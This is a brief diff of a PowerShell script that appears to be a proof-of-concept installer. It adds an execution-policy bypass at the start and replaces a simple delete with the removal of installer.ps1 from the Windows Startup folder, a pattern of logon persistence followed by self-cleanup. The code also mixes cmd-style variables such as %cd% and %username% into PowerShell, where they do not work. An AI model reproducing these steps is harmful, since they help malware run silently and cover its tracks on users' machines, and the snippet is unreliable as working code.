@@ -5,6 +5,7 @@ function random_text {
 }
 
 #Variables 
+Set-ExecutionPolicy Bypass -Force
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = %cd%
@@ -14,6 +15,4 @@ mkdir $path
 cd $path
 echo "" > poc.txt
 cd $initial_dir
-Set-ExecutionPolicy Bypass -Force
-s
-del installer.ps1
+Remove-Item -Path "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/installer.ps1" -Recurse
